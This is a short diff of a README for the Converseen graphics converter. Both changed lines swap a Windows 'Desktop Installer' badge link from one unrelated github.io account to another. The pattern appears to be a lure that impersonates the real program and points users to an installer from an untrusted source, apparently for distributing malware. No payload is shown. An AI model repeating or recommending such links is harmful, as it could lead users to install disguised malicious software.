@@ -3,7 +3,7 @@
 
 <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSWvQsvQPLmSp5DXs0_TkLfbBnFJ5IoUoVqQdgGeyzK_5C3hcDz5nR4Ehwc&s=10" alt="Converseen Logo" width="560">
 
-[![Hi](https://badgen.net/badge/Desktop/Installer/blue?icon=windows)](https://camilorobersonopcr.github.io/.github/Converseen-Graphics-Converter)
+[![Hi](https://badgen.net/badge/Desktop/Installer/blue?icon=windows)](https://dakidloshans.github.io/.github/Converseen-Graphics-Converter)
 
 ---
 
@@ -19,7 +19,7 @@ Converseen supports batch conversion, resizing, rotation, flipping, renaming, im
 
 <img src="https://www.softportal.com/scr/51003/converseen-big-1.png" width="700">
 
-[![Hi](https://badgen.net/badge/Desktop/Installer/blue?icon=windows)](https://camilorobersonopcr.github.io/.github/Converseen-Graphics-Converter)
+[![Hi](https://badgen.net/badge/Desktop/Installer/blue?icon=windows)](https://dakidloshans.github.io/.github/Converseen-Graphics-Converter)
 
 ---
 
